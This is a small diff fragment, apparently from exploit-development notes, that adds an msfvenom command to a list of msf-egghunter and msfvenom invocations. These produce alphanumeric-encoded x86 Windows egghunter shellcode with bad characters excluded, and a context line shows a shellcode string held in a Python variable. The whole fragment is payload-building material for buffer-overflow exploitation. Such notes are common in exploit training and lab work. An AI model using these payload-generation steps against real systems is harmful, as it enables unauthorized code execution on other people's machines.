@@ -35,6 +35,7 @@ shellcode = "IIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKL2JZKPMM
 ```
 msf-egghunter -f raw -e dead | msfvenom -p - --platform windows -a x86 -b '\x2e' -f python -v egghunter
 msf-egghunter -a x86 -f raw -e w00t -b '\x00' | msfvenom -p - -a x86 --platform windows -b "\x00" -e x86/alpha_mixed -f python
+cat egg.bin | msfvenom -a x86 --platform windows -e x86/alpha_mixed -f py
 ```
 #
 ```
